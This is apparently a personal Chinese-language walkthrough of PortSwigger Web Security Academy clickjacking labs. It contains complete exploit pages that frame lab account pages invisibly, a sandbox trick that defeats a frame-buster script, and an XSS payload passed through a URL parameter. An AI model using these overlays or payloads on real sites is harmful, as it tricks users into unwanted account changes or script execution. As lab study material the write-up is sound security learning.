---
title: Clickjacking
description: Clickjacking
last_update:
  date: "2025-08-13T08:00:00+08:00"
---

## Lab: Basic clickjacking with CSRF token protection

| Dimension | Description                                                                                    |
| --------- | ---------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/clickjacking#how-to-construct-a-basic-clickjacking-attack |
| Lab       | https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected                     |

基礎題，在 exploit-server 的 response body 設定以下 html

```html
<html>
  <head></head>
  <body>
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
      }
      iframe {
        position: absolute;
        width: 500px;
        height: 600px;
        z-index: 1;
        opacity: 0.0001;
      }
      div {
        position: absolute;
        top: 485px;
        left: 50px;
        z-index: 0;
      }
    </style>
    <iframe
      src="https://0a8f009a040328ad8290936800c200c7.web-security-academy.net/my-account"
    ></iframe>
    <div>click</div>
  </body>
</html>
```

## Lab: Clickjacking with form input data prefilled from a URL parameter

| Dimension | Description                                                                              |
| --------- | ---------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/clickjacking#clickjacking-with-prefilled-form-input |
| Lab       | https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input               |

基礎題，跟上一題比起來，就是多了一個 `?email=wiener4@normal-user.net` 的 querystring，在 exploit-server 的 response body 設定以下 html

```html
<html>
  <head></head>
  <body>
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
      }
      iframe {
        position: absolute;
        width: 500px;
        height: 500px;
        z-index: 1;
      }
      div {
        position: absolute;
        top: 450px;
        left: 50px;
        z-index: 0;
      }
    </style>
    <iframe
      src="https://0a280028033be4478041941b0035007f.web-security-academy.net/my-account?email=wiener4@normal-user.net"
    ></iframe>
    <div>Click me</div>
  </body>
</html>
```

## Lab: Clickjacking with a frame buster script

| Dimension | Description                                                               |
| --------- | ------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/clickjacking#frame-busting-scripts   |
| Lab       | https://portswigger.net/web-security/clickjacking/lab-frame-buster-script |

還好之前有寫過 [iframe security](../http/iframe-security.md) 這篇文章，所以對於 `<iframe sandbox` 的機制還有一點印象

進到 Lab 以後，先觀察 Lab 是怎麼做 frame busting 的

```html
<script>
  if (top != self) {
    window.addEventListener(
      "DOMContentLoaded",
      function () {
        document.body.innerHTML = "This page cannot be framed";
      },
      false,
    );
  }
</script>
```

在 exploit-server 的 response body 設定以下 html，重點是 `<iframe sandbox="allow-forms">`，這樣可以阻止 `window.addEventListener("DOMContentLoaded")` 的執行，因為沒有 [allow-scripts](../http/iframe-security.md#iframe-sandbox)

```html
<html>
  <head></head>
  <body>
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
      }
      iframe {
        position: absolute;
        width: 500px;
        height: 500px;
        z-index: 1;
      }
      div {
        position: absolute;
        top: 440px;
        left: 50px;
        z-index: 0;
      }
    </style>
    <iframe
      src="https://0a3b00d70372c11b8002300c006000a8.web-security-academy.net/my-account?email=wiener2@normal-user.net"
      sandbox="allow-forms"
    ></iframe>
    <div>Click me</div>
  </body>
</html>
```

## Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

| Dimension | Description                                                                                    |
| --------- | ---------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/clickjacking#combining-clickjacking-with-a-dom-xss-attack |
| Lab       | https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss      |

這題要先找出 DOM-based XSS 的注入點，因為 Lab 突然多了一個 "Submit Feedback" 的功能，所以馬上引起我的注意

觀察 submitFeedback.js

```js
function displayFeedbackMessage(name) {
  return function () {
    var feedbackResult = document.getElementById("feedbackResult");
    if (this.status === 200) {
      feedbackResult.innerHTML =
        "Thank you for submitting feedback" + (name ? ", " + name : "") + "!";
      feedbackForm.reset();
    } else {
      feedbackResult.innerHTML =
        "Failed to submit feedback: " + this.responseText;
    }
  };
}
```

構造 `?name=<img src="x" onerror="print()"/>&email=123@123&subject=123&message=123`，送出以後就會觸發 XSS

在 exploit-server 的 response body 設定以下 html（這題的 CSS 稍微不好調，因為表單很高XD）

```html
<html>
  <head></head>
  <body>
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
      }
      iframe {
        position: absolute;
        width: 500px;
        height: 900px;
        z-index: 1;
      }
      div {
        position: absolute;
        top: 800px;
        left: 50px;
        z-index: 0;
      }
    </style>
    <iframe
      src="https://0a6800320415217880893a260030005e.web-security-academy.net/feedback?name=%3Cimg%20src=%22x%22%20onerror=%22print()%22/%3E&email=123@123&subject=123&message=123"
    ></iframe>
    <div>Click me</div>
  </body>
</html>
```

## Lab: Multistep clickjacking

| Dimension | Description                                                              |
| --------- | ------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/clickjacking#multistep-clickjacking |
| Lab       | https://portswigger.net/web-security/clickjacking/lab-multistep          |

這題真的是純考驗 CSS 切版能力～

```html
<html>
  <head></head>
  <body>
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
      }
      iframe {
        position: absolute;
        width: 500px;
        height: 700px;
        z-index: 1;
      }
      #step1 {
        position: absolute;
        top: 485px;
        left: 50px;
        z-index: 0;
      }
      #step2 {
        position: absolute;
        top: 285px;
        left: 192px;
        z-index: 0;
      }
    </style>
    <iframe
      src="https://0aea00c7038e05e581d28e4300920020.web-security-academy.net/my-account"
    ></iframe>
    <div id="step1">Click me first</div>
    <div id="step2">Click me next</div>
  </body>
</html>
```

## 小結

clickjacking 的題目，很快地就結束了，整體來說我覺得都算容易，但實務上我覺得 clickjacking 很難單獨算一個 bug bounty 會收的類型，但也許在滲透測試，這是一個滲透的手段(?

## 參考資料

- https://portswigger.net/web-security/clickjacking
